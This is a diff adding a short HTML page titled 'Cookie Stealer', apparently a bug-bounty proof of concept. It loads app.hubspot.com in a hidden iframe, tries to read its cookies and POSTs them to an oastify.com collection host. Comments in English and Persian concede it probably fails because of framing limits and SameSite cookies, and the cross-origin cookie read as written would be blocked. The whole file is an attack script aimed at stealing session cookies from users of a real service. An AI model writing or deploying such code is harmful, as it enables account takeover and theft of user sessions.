@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cookie Stealer</title>
+</head>
+<body>
+    <iframe id="hsFrame" src="https://app.hubspot.com" style="display:none;"></iframe>
+    <script>
+    // This only works if HubSpot allows framing (which they probably don't)
+    // و معمولاً به خاطر SameSite=Lax کار نمی‌کند
+    
+    document.getElementById('hsFrame').onload = function() {
+        try {
+            var frame = document.getElementById('hsFrame');
+            var cookies = frame.contentDocument.cookie;
+            
+            fetch('https://yuwponvu168v1ltzgwpw6spct3zunkb9.oastify.com', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify({cookies: cookies})
+            });
+        } catch(e) {
+            console.log('Cannot access iframe:', e);
+        }
+    };
+    </script>
+</body>
+</html>
